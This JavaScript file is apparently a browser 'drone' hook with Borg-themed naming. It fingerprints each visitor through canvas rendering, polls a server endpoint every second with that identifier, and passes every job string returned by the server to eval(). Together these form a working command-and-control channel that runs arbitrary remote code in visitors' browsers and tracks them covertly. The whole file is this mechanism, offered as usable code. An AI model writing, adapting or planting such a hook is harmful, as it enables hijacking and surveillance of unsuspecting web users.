var dr0ne = {};
dr0ne.assimilate = function () {
    dr0ne.log('We are b0rg!');
    dr0ne.log('We will comply!');



    setInterval(dr0ne.interLinkCheck, dr0ne.interLinkFrequency);
};

dr0ne.log = function (message) {
    console.log('[dr0ne] ' + message);
};

/**
 *   Create XHR Object for interLink
 **/
dr0ne.interLink = undefined;
if (window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari
    dr0ne.interLink = new XMLHttpRequest();
}
else {// code for IE6, IE5
    dr0ne.interLink = new ActiveXObject("Microsoft.XMLHTTP");
}

dr0ne.interLinkFrequency = 1000;
dr0ne.interLinkInterval = undefined;
dr0ne.interLinkRequestCounter = 0;
dr0ne.interLinkResponseCounter = 0;

/**≠
 *   Create XHR Ready Callback
 **/
dr0ne.interLinkAnswer = function () {
    // Only react if reciving ansewer is complete
    if (dr0ne.interLink.readyState == 4) {
        //dr0ne.log('Response revived!');
        dr0ne.interLinkResponseCounter = dr0ne.interLinkResponseCounter + 1;
        dr0ne.log('Response Count: ' + dr0ne.interLinkResponseCounter);
        var response = JSON.parse(dr0ne.interLink.responseText);
        console.log(response);
        if (response.jobs.length) {
            response.jobs.forEach(function (entry) {
                console.log(entry);
                eval(entry); // jshint ignore:line
            });
        }
    }
};

dr0ne.interLink.onreadystatechange = dr0ne.interLinkAnswer;

dr0ne.interLinkCheck = function () {
    //dr0ne.log('Checking interLink ...');
    dr0ne.interLinkRequestCounter = dr0ne.interLinkRequestCounter + 1;
    dr0ne.log('Request Count: ' + dr0ne.interLinkRequestCounter);
    dr0ne.interLink.open("GET", "/interlink?d="+dr0ne.getIdentifier()+"&t=" + Math.random(), true);
    dr0ne.interLink.send();
};

dr0ne.interLinkDisconnect = function () {
    dr0ne.log('Disconnecting dr0ne from HIVE ...');
    clearInterval(dr0ne.interLinkInterval);
};


/**
 * Canvas Tracking Implementation
 * State your designation
 * @param salt
 * @returns {string}
 */

dr0ne.getIdentifier = function (salt) {
    var canvas = document.createElement('canvas');
    var context = canvas.getContext("2d");
    context.fillText(salt, 20, 20);
    var data = canvas.toDataURL("image/png");
    var b64 = data.replace("data:image/png;base64,", "");
    var bin = atob(b64);
    var i, l, o = '',
        n;

    var s = bin.slice(-16, -12);
    s += '';

    for (i = 0, l = s.length; i < l; i++) {
        n = s.charCodeAt(i)
            .toString(16);
        o += n.length < 2 ? '0' + n : n;
    }
    return o;
};

/**
 * Run Assimilation
 */
dr0ne.assimilate();

